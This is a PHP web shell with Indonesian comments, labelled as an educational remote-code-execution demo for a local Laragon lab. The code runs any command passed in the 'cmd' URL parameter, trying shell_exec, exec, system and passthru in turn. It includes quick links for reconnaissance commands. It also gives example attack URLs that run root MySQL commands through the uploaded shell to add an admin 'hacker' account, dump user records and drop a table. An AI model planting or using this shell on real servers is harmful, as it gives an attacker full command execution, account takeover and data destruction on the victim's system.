<?php
/**
 * Simple Web Shell - UNTUK TUJUAN EDUKASI SAJA!
 * File ini mendemonstrasikan Remote Code Execution (RCE)
 * JANGAN GUNAKAN DI PRODUCTION!
 */

// Set error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Header
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell - RCE Demo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #0f0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #000;
            border: 2px solid #0f0;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #0f0;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
        }
        .warning {
            background: #ff0000;
            color: #fff;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        .info-box {
            background: #1a3a1a;
            border: 1px solid #0f0;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .info-box h3 {
            color: #0ff;
            margin-bottom: 10px;
        }
        .info-box p {
            margin: 5px 0;
            font-size: 14px;
        }
        .command-form {
            margin-bottom: 20px;
        }
        .command-form label {
            display: block;
            margin-bottom: 10px;
            color: #0ff;
            font-weight: bold;
        }
        .command-form input[type="text"] {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
        }
        .command-form button {
            margin-top: 10px;
            padding: 12px 30px;
            background: #0f0;
            color: #000;
            border: none;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
        }
        .command-form button:hover {
            background: #0ff;
            box-shadow: 0 0 15px #0ff;
        }
        .output {
            background: #000;
            border: 2px solid #0f0;
            padding: 20px;
            border-radius: 5px;
            min-height: 200px;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 14px;
            line-height: 1.6;
        }
        .output h3 {
            color: #0ff;
            margin-bottom: 15px;
        }
        .examples {
            background: #1a1a3a;
            border: 1px solid #00f;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .examples h3 {
            color: #00f;
            margin-bottom: 10px;
        }
        .examples code {
            display: block;
            background: #000;
            padding: 10px;
            margin: 8px 0;
            border-left: 3px solid #00f;
            color: #0ff;
            overflow-x: auto;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        .quick-btn {
            padding: 10px;
            background: #1a1a3a;
            border: 1px solid #00f;
            color: #0ff;
            cursor: pointer;
            border-radius: 5px;
            text-align: center;
            transition: all 0.3s;
            text-decoration: none;
            display: block;
        }
        .quick-btn:hover {
            background: #00f;
            color: #fff;
            box-shadow: 0 0 10px #00f;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚠️ WEB SHELL - RCE DEMO ⚠️</h1>
            <p>Remote Code Execution Vulnerability</p>
        </div>

        <div class="warning">
            ⚠️ FILE INI HANYA UNTUK EDUKASI KEAMANAN! JANGAN GUNAKAN DI PRODUCTION! ⚠️
        </div>

        <div class="info-box">
            <h3>📊 System Information</h3>
            <p><strong>Server OS:</strong> <?php echo PHP_OS; ?></p>
            <p><strong>PHP Version:</strong> <?php echo PHP_VERSION; ?></p>
            <p><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
            <p><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></p>
            <p><strong>Current Directory:</strong> <?php echo getcwd(); ?></p>
            <p><strong>Current User:</strong> <?php echo get_current_user(); ?></p>
        </div>

        <!-- Command Form -->
        <div class="command-form">
            <form method="GET" action="">
                <label>💻 Execute Command:</label>
                <input type="text" name="cmd" placeholder="Enter command here..." 
                       value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>">
                <button type="submit">Execute</button>
            </form>
        </div>

        <!-- Quick Commands -->
        <div class="quick-commands">
            <a href="?cmd=dir" class="quick-btn">📁 List Files (dir)</a>
            <a href="?cmd=whoami" class="quick-btn">👤 Who Am I</a>
            <a href="?cmd=ipconfig" class="quick-btn">🌐 IP Config</a>
            <a href="?cmd=php -v" class="quick-btn">📝 PHP Version</a>
            <a href="?cmd=echo %cd%" class="quick-btn">📂 Current Dir</a>
            <a href="?cmd=net user" class="quick-btn">👥 Users List</a>
        </div>

        <!-- Output -->
        <?php
        if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
            $cmd = $_GET['cmd'];
            echo '<div class="output">';
            echo '<h3>📤 Command Output:</h3>';
            echo '<p style="color: #ff0; margin-bottom: 15px;">Command: ' . htmlspecialchars($cmd) . '</p>';
            
            // Execute command
            $output = '';
            $return_var = 0;
            
            // Try different execution methods
            if (function_exists('shell_exec')) {
                $output = shell_exec($cmd . ' 2>&1');
            } elseif (function_exists('exec')) {
                exec($cmd . ' 2>&1', $output_array, $return_var);
                $output = implode("\n", $output_array);
            } elseif (function_exists('system')) {
                ob_start();
                system($cmd . ' 2>&1', $return_var);
                $output = ob_get_clean();
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($cmd . ' 2>&1', $return_var);
                $output = ob_get_clean();
            } else {
                $output = "Error: No execution function available!";
            }
            
            if (empty($output)) {
                $output = "Command executed but returned no output.";
            }
            
            echo htmlspecialchars($output);
            echo '</div>';
        }
        ?>

        <!-- MySQL Examples for Laragon -->
        <div class="examples">
            <h3>🗄️ MySQL Commands untuk Laragon (Windows):</h3>
            
            <p><strong>1. Show Databases:</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SHOW DATABASES;"</code>
            
            <p><strong>2. Show Tables in security_demo:</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "USE security_demo; SHOW TABLES;"</code>
            
            <p><strong>3. Select All Users:</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SELECT * FROM security_demo.users;"</code>
            
            <p><strong>4. Insert New User (Hacker):</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "INSERT INTO security_demo.users (username, password, email, role) VALUES ('hacker', 'hack123', 'hacker@evil.com', 'admin');"</code>
            
            <p><strong>5. Update User Role:</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "UPDATE security_demo.users SET role='admin' WHERE username='hacker';"</code>
            
            <p><strong>6. Delete User:</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "DELETE FROM security_demo.users WHERE username='hacker';"</code>
            
            <p><strong>7. Drop Table (Dangerous!):</strong></p>
            <code>C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "DROP TABLE security_demo.messages;"</code>
        </div>

        <div class="examples" style="background: #3a1a1a; border-color: #f00;">
            <h3 style="color: #f00;">🚨 URL Exploit Examples:</h3>
            
            <p><strong>Ganti path sesuai lokasi file shell.php Anda!</strong></p>
            
            <p>Base URL: <code>http://localhost/security-demo/uploads/shell.php</code></p>
            
            <p><strong>1. List Files:</strong></p>
            <code>http://localhost/security-demo/uploads/shell.php?cmd=dir</code>
            
            <p><strong>2. Show Databases:</strong></p>
            <code>http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SHOW DATABASES;"</code>
            
            <p><strong>3. Insert Hacker User:</strong></p>
            <code>http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "INSERT INTO security_demo.users (username, password, email, role) VALUES ('hacker', 'hack123', 'hacker@evil.com', 'admin');"</code>
            
            <p><strong>4. Read Users:</strong></p>
            <code>http://localhost/security-demo/uploads/shell.php?cmd=C:\laragon\bin\mysql\mysql-8.0.30-winx64\bin\mysql.exe -u root -e "SELECT * FROM security_demo.users;"</code>
        </div>

        <div class="info-box" style="margin-top: 20px;">
            <h3>📝 Catatan Penting:</h3>
            <p>• Path MySQL di Laragon biasanya: <strong>C:\laragon\bin\mysql\[versi-mysql]\bin\mysql.exe</strong></p>
            <p>• Sesuaikan versi MySQL Anda (cek di folder Laragon)</p>
            <p>• Command harus di-URL encode jika dijalankan via browser langsung</p>
            <p>• File shell.php ini upload melalui halaman vulnerable.php</p>
            <p>• Demonstrasi ini menunjukkan bahaya RCE (Remote Code Execution)</p>
        </div>
    </div>
</body>
</html>